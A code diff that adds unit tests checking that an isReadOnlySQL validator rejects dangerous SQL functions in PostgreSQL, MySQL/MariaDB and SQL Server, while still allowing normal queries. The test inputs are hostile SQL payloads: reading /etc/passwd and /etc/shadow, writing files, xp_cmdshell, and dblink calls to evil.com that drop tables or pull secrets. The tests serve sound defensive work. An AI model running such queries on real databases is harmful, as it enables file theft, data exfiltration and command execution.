@@ -266,4 +266,131 @@ describe("isReadOnlySQL", () => {
       expect(isReadOnlySQL("/*M! DROP TABLE users */", "mysql")).toBe(false);
     });
   });
+
+  describe("dangerous function blocking", () => {
+    // PostgreSQL filesystem functions
+    it("should reject pg_read_file", () => {
+      expect(isReadOnlySQL("SELECT pg_read_file('/etc/passwd', 0, 100)", "postgres")).toBe(false);
+    });
+
+    it("should reject pg_read_binary_file", () => {
+      expect(isReadOnlySQL("SELECT pg_read_binary_file('/etc/shadow')", "postgres")).toBe(false);
+    });
+
+    it("should reject pg_ls_dir", () => {
+      expect(isReadOnlySQL("SELECT pg_ls_dir('/etc')", "postgres")).toBe(false);
+    });
+
+    it("should reject pg_stat_file", () => {
+      expect(isReadOnlySQL("SELECT pg_stat_file('/etc/passwd')", "postgres")).toBe(false);
+    });
+
+    it("should reject pg_ls_waldir", () => {
+      expect(isReadOnlySQL("SELECT pg_ls_waldir()", "postgres")).toBe(false);
+    });
+
+    // PostgreSQL configuration and connection management
+    it("should reject set_config", () => {
+      expect(isReadOnlySQL("SELECT set_config('log_statement', 'none', false)", "postgres")).toBe(false);
+    });
+
+    it("should reject pg_terminate_backend", () => {
+      expect(isReadOnlySQL("SELECT pg_terminate_backend(12345)", "postgres")).toBe(false);
+    });
+
+    it("should reject pg_cancel_backend", () => {
+      expect(isReadOnlySQL("SELECT pg_cancel_backend(12345)", "postgres")).toBe(false);
+    });
+
+    it("should reject pg_reload_conf", () => {
+      expect(isReadOnlySQL("SELECT pg_reload_conf()", "postgres")).toBe(false);
+    });
+
+    // PostgreSQL large object and file write functions
+    it("should reject lo_export", () => {
+      expect(isReadOnlySQL("SELECT lo_export(12345, '/tmp/evil.sh')", "postgres")).toBe(false);
+    });
+
+    it("should reject lo_import", () => {
+      expect(isReadOnlySQL("SELECT lo_import('/etc/passwd')", "postgres")).toBe(false);
+    });
+
+    it("should reject pg_file_write", () => {
+      expect(isReadOnlySQL("SELECT pg_file_write('/tmp/x', 'data', false)", "postgres")).toBe(false);
+    });
+
+    // PostgreSQL dblink
+    it("should reject dblink_exec", () => {
+      expect(isReadOnlySQL("SELECT dblink_exec('host=evil.com', 'DROP TABLE users')", "postgres")).toBe(false);
+    });
+
+    it("should reject dblink", () => {
+      expect(isReadOnlySQL("SELECT * FROM dblink('host=evil.com', 'SELECT secret FROM keys') AS t(s text)", "postgres")).toBe(false);
+    });
+
+    // PostgreSQL functions inside WITH/subqueries
+    it("should reject pg_read_file inside a CTE", () => {
+      expect(isReadOnlySQL("WITH data AS (SELECT pg_read_file('/etc/passwd')) SELECT * FROM data", "postgres")).toBe(false);
+    });
+
+    it("should reject pg_read_file in subquery", () => {
+      expect(isReadOnlySQL("SELECT * FROM (SELECT pg_read_file('/etc/hosts')) AS t", "postgres")).toBe(false);
+    });
+
+    // Ensure normal functions are NOT blocked
+    it("should allow normal aggregate functions", () => {
+      expect(isReadOnlySQL("SELECT count(*), avg(salary) FROM employees", "postgres")).toBe(true);
+    });
+
+    it("should allow string functions", () => {
+      expect(isReadOnlySQL("SELECT upper(name), length(name) FROM users", "postgres")).toBe(true);
+    });
+
+    it("should allow pg_catalog queries", () => {
+      expect(isReadOnlySQL("SELECT * FROM pg_catalog.pg_tables", "postgres")).toBe(true);
+    });
+
+    it("should allow current_setting (read-only counterpart of set_config)", () => {
+      expect(isReadOnlySQL("SELECT current_setting('server_version')", "postgres")).toBe(true);
+    });
+
+    // MySQL/MariaDB dangerous functions
+    it("should reject LOAD_FILE in MySQL", () => {
+      expect(isReadOnlySQL("SELECT load_file('/etc/passwd')", "mysql")).toBe(false);
+    });
+
+    it("should reject LOAD_FILE in MariaDB", () => {
+      expect(isReadOnlySQL("SELECT load_file('/etc/passwd')", "mariadb")).toBe(false);
+    });
+
+    it("should reject SELECT INTO OUTFILE in MySQL", () => {
+      expect(isReadOnlySQL("SELECT * FROM users INTO OUTFILE '/tmp/dump.csv'", "mysql")).toBe(false);
+    });
+
+    it("should reject SELECT INTO DUMPFILE in MySQL", () => {
+      expect(isReadOnlySQL("SELECT * FROM users INTO DUMPFILE '/tmp/dump.bin'", "mysql")).toBe(false);
+    });
+
+    // SQL Server dangerous functions
+    it("should reject xp_cmdshell in SQL Server", () => {
+      expect(isReadOnlySQL("SELECT * FROM xp_cmdshell('whoami')", "sqlserver")).toBe(false);
+    });
+
+    it("should reject xp_dirtree in SQL Server", () => {
+      expect(isReadOnlySQL("SELECT * FROM xp_dirtree('C:\\')", "sqlserver")).toBe(false);
+    });
+
+    it("should reject OPENROWSET in SQL Server", () => {
+      expect(isReadOnlySQL("SELECT * FROM openrowset('SQLOLEDB','server';'user';'pass','SELECT 1')", "sqlserver")).toBe(false);
+    });
+
+    // Cross-dialect: dangerous PG functions should NOT be blocked for other dialects
+    it("should not block pg_read_file in MySQL (not a MySQL function)", () => {
+      expect(isReadOnlySQL("SELECT pg_read_file FROM some_table", "mysql")).toBe(true);
+    });
+
+    it("should not block load_file in PostgreSQL (not a PG function)", () => {
+      expect(isReadOnlySQL("SELECT load_file FROM some_table", "postgres")).toBe(true);
+    });
+  });
 });
